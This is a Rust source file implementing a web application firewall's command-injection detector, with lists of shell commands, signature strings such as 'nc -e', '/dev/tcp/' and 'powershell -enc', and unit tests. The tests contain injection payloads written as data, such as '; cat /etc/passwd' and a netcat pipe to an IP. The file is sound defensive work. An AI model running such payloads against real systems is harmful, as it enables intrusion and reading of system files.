//! Command-injection detection — **structure required**.
//!
//! The old CRS rule flags a shell metacharacter followed by any of `cat|ls|id|…`,
//! which fires on ordinary prose ("D'Angelo & Sons; cat lovers", a search for "id
//! card") and is the single worst false-positive source. Here a bare command word
//! is never enough. A detection requires one of:
//!   * a precise high-signal invocation (`/bin/sh -c`, `nc -e`, `powershell -enc`…);
//!   * a command inside a substitution (`` `cmd` `` / `$(cmd)`), which is always
//!     shell — any command counts;
//!   * after a chaining operator (`;` `|` `&&` newline), either a *download /
//!     interpreter / reverse-shell* command (rarely benign), or an ordinary
//!     command **followed by a shell-ish argument** (a path, flag, redirect, or
//!     variable) — so "; cat lovers" stays benign while "; cat /etc/passwd" does not.

use fluxgate_core::WafRisk;

/// Commands that, in command position, indicate injection. Kept sorted for
/// `binary_search`.
const COMMANDS: &[&str] = &[
    "base64",
    "bash",
    "bitsadmin",
    "cat",
    "certutil",
    "chmod",
    "chown",
    "cmd",
    "cp",
    "csc",
    "cscript",
    "curl",
    "dig",
    "ftp",
    "gcc",
    "hostname",
    "id",
    "ifconfig",
    "ip",
    "kill",
    "ksh",
    "ls",
    "lua",
    "mshta",
    "mv",
    "nc",
    "ncat",
    "net",
    "netcat",
    "nmap",
    "nohup",
    "nslookup",
    "perl",
    "php",
    "ping",
    "powershell",
    "ps",
    "python",
    "python2",
    "python3",
    "reg",
    "regsvr32",
    "rm",
    "ruby",
    "schtasks",
    "sh",
    "ssh",
    "systeminfo",
    "tasklist",
    "tcpdump",
    "telnet",
    "tftp",
    "uname",
    "wget",
    "whoami",
    "wmic",
    "wscript",
    "xxd",
    "zsh",
];

/// Commands rarely benign right after a chaining operator (download, interpreter,
/// reverse-shell, lateral-movement). Flagged without needing a shell-ish arg.
const HIGH_CONFIDENCE: &[&str] = &[
    "bash",
    "bitsadmin",
    "certutil",
    "cmd",
    "csc",
    "cscript",
    "curl",
    "ksh",
    "lua",
    "mshta",
    "nc",
    "ncat",
    "netcat",
    "nmap",
    "perl",
    "php",
    "powershell",
    "python",
    "python2",
    "python3",
    "regsvr32",
    "ruby",
    "schtasks",
    "sh",
    "ssh",
    "telnet",
    "tftp",
    "wget",
    "wmic",
    "wscript",
    "zsh",
];

/// Precise, unambiguous invocations flagged wherever they appear.
const SIGNATURES: &[&str] = &[
    "/bin/sh",
    "/bin/bash",
    "/bin/zsh",
    "bash -c",
    "sh -c",
    "zsh -c",
    "nc -e",
    "ncat -e",
    "cmd /c",
    "cmd.exe /c",
    "powershell -e",
    "powershell -enc",
    "powershell -nop",
    "/dev/tcp/",
    "/dev/udp/",
    "certutil -urlcache",
    "bitsadmin /transfer",
];

/// `lower` is the caller's shared lowercased view of the value.
pub fn detect(lower: &str) -> Option<(WafRisk, String)> {
    for sig in SIGNATURES {
        if lower.contains(sig) {
            return Some((WafRisk::High, format!("sig:{sig}")));
        }
    }

    // `$IFS` / `${IFS}` (the shell's internal field separator) is the canonical
    // token for space-less command-injection evasion (`cat$IFS$9/etc/passwd`,
    // `x${IFS}y`); it is essentially never benign in a request value.
    if lower.contains("$ifs") || lower.contains("${ifs") {
        return Some((WafRisk::High, "ifs_evasion".into()));
    }

    let bytes = lower.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        // Classify the operator at i.
        let (oplen, substitution) = match bytes[i] {
            b'`' => (1, true),
            b'$' if i + 1 < bytes.len() && bytes[i + 1] == b'(' => (2, true),
            b';' | b'|' | b'\n' => (1, false),
            b'&' => (1, false),
            _ => {
                i += 1;
                continue;
            }
        };
        if let Some((cmd, after)) = command_after(bytes, i + oplen) {
            let flag = substitution
                || HIGH_CONFIDENCE.binary_search(&cmd).is_ok()
                || shellish_arg(bytes, after);
            if flag {
                return Some((WafRisk::High, format!("cmd:{cmd}")));
            }
        }
        i += oplen;
    }
    None
}

/// Read the command word in command position starting at `pos`: skip whitespace
/// and an optional absolute path prefix, then match the leading word against
/// [`COMMANDS`]. Returns the matched command and the index just past it.
fn command_after(b: &[u8], pos: usize) -> Option<(&'static str, usize)> {
    let mut j = pos;
    while j < b.len() && (b[j] == b' ' || b[j] == b'\t' || b[j] == b'(' || b[j] == b'{') {
        j += 1;
    }
    let word_start = j;
    let mut last_slash = None;
    while j < b.len()
        && (b[j].is_ascii_alphanumeric()
            || b[j] == b'/'
            || b[j] == b'.'
            || b[j] == b'_'
            || b[j] == b'-')
    {
        if b[j] == b'/' {
            last_slash = Some(j);
        }
        j += 1;
    }
    let name_start = match last_slash {
        Some(s) => s + 1,
        None => word_start,
    };
    if name_start >= j {
        return None;
    }
    let word_str = std::str::from_utf8(&b[name_start..j]).ok()?;
    COMMANDS
        .binary_search(&word_str)
        .ok()
        .map(|idx| (COMMANDS[idx], j))
}

/// Whether what follows a command word looks like a shell argument (a path,
/// flag, redirect, variable, pipe, or another substitution) rather than an
/// ordinary English word.
fn shellish_arg(b: &[u8], after: usize) -> bool {
    let mut j = after;
    while j < b.len() && (b[j] == b' ' || b[j] == b'\t') {
        j += 1;
    }
    if j >= b.len() {
        return false; // command at end of input with no args — treat as prose
    }
    match b[j] {
        b'/' | b'-' | b'$' | b'>' | b'<' | b'|' | b'&' | b';' | b'`' | b'.' | b'~' | b'*' => true,
        // A bare token that itself contains a '/' (e.g. `cat etc/passwd`).
        _ => {
            let mut k = j;
            while k < b.len() && !b[k].is_ascii_whitespace() {
                if b[k] == b'/' {
                    return true;
                }
                k += 1;
            }
            false
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Test shim: the real `detect` now takes a pre-lowered view from the caller.
    fn detect(v: &str) -> Option<(WafRisk, String)> {
        super::detect(&v.to_ascii_lowercase())
    }

    #[test]
    fn commands_sorted() {
        let mut s = COMMANDS.to_vec();
        s.sort_unstable();
        assert_eq!(s, COMMANDS, "COMMANDS must stay sorted for binary_search");
    }

    #[test]
    fn real_injections_flagged() {
        assert_eq!(detect("1; cat /etc/passwd").unwrap().0, WafRisk::High);
        assert_eq!(detect("x | nc 10.0.0.1 4444").unwrap().0, WafRisk::High);
        assert_eq!(detect("`id`").unwrap().0, WafRisk::High);
        assert_eq!(detect("$(whoami)").unwrap().0, WafRisk::High);
        assert_eq!(
            detect("a && /usr/bin/wget http://x").unwrap().0,
            WafRisk::High
        );
        assert_eq!(detect("foo /bin/sh -i").unwrap().0, WafRisk::High);
        assert_eq!(detect("powershell -enc ZQBjAGgA").unwrap().0, WafRisk::High);
    }

    #[test]
    fn benign_prose_not_flagged() {
        assert!(detect("cats and dogs").is_none());
        assert!(detect("my id card number").is_none());
        assert!(detect("D'Angelo & Sons; cat lovers club").is_none());
        assert!(detect("rock & roll").is_none());
        assert!(detect("ls of items & more").is_none());
        assert!(detect("the report; please review").is_none());
    }
}
